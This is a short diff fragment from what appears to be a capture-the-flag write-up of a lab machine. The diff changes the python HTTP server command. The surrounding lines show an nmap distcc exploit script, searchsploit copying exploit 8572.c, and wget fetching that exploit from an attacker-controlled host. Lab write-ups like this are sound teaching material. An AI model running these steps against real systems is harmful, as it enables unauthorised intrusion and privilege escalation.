@@ -72,7 +72,7 @@ nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve20
 searchsploit -m 8572.c
 ```
 ```
-python -m SimpleHTTPServer 9005
+python3 -m http.server 8000 
 ```
 ```
 wget http://10.10.14.20:5555/8572.c
